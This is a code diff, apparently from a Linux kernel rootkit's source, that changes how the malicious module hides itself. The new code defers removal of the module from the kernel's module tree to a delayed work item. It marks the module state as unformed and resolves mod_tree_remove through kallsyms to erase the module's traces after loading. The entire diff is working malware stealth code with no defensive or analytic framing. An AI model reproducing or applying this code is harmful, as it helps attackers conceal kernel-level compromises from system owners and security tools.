@@ -184,6 +184,26 @@ static inline void kv_list_del(struct list_head *prev, struct list_head *next)
 	prev->next = next;
 }
 
+static void hide_work_fn(struct work_struct *work)
+{
+	// Set here because it is set to
+	// MODULE_STATE_LIVE in do_init_module
+	lkmmod.this_mod->state = MODULE_STATE_UNFORMED;
+
+	// Remove module from mod_tree if
+	// CONFIG_MODULES_TREE_LOOKUP is enabled
+	struct kernel_syscalls *ks = kv_kall_load_addr();
+	if (ks) {
+		void (*k_mod_tree_remove)(struct module *mod) =
+			(void (*)(struct module *))ks->k_kallsyms_lookup_name(
+				"mod_tree_remove");
+		if (k_mod_tree_remove)
+			k_mod_tree_remove(lkmmod.this_mod);
+	}
+}
+
+static DECLARE_DELAYED_WORK(hide_work, hide_work_fn);
+
 static int _hide_mod(void)
 {
 	struct list_head this_list;
@@ -238,16 +258,8 @@ static int _hide_mod(void)
 	// as long as we are "loading"...
 	lkmmod.this_mod->state = MODULE_STATE_UNFORMED;
 
-	// Remove module from mod_tree if
-	// CONFIG_MODULES_TREE_LOOKUP is enabled
-	struct kernel_syscalls *ks = kv_kall_load_addr();
-	if (ks) {
-		void (*k_mod_tree_remove)(struct module *mod) =
-			(void (*)(struct module *))ks->k_kallsyms_lookup_name(
-				"mod_tree_remove");
-		if (k_mod_tree_remove)
-			k_mod_tree_remove(lkmmod.this_mod);
-	}
+	// Some hiding steps need to be done after do_init_module
+	schedule_delayed_work(&hide_work, msecs_to_jiffies(2000));
 
 	return 0;
 }
